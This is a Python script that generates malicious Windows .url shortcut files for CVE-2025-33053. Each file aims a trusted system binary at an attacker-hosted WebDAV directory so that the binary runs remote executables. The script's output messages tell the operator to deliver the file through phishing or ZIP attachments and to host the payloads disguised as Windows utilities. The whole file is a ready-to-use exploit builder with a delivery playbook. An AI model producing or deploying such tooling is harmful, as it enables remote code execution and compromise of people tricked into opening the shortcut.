import argparse
import os

URL_TEMPLATE = """
[InternetShortcut]
URL={binary_path}
WorkingDirectory={unc_path}
IconFile={icon_path}
"""

def generate_url(output, binary_path, unc_path, icon_path=None):
    if not icon_path:
        icon_path = binary_path

    content = URL_TEMPLATE.format(
        binary_path=binary_path,
        unc_path=unc_path,
        icon_path=icon_path
    )
    with open(output, "w") as f:
        f.write(content.strip())
    print(f"[+] Malicious .url file written to: {output}")
    print("[+] Deliver this via phishing or social engineering (e.g., ZIP attachment)")
    print("[!] Ensure WebDAV host ({unc_path}) is serving malicious executables named as Windows LOLBins (e.g., route.exe).")

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-33053 WebDAV .url generator")
    parser.add_argument("-o", "--output", required=True, help="Path for generated .url file")
    parser.add_argument("-b", "--binary", default=r"C:\\Windows\\System32\\iediagcmd.exe",
                        help="Trusted LOLBin to execute (default: iediagcmd.exe)")
    parser.add_argument("-u", "--unc", required=True,
                        help="UNC WebDAV path hosting malicious executables (e.g., //attacker.com/DavWWWRoot)")
    parser.add_argument("-i", "--icon", default=None,
                        help="Icon file path (optional, defaults to same as --binary)")
    args = parser.parse_args()

    generate_url(args.output, args.binary, args.unc, args.icon)

if __name__ == "__main__":
    main()
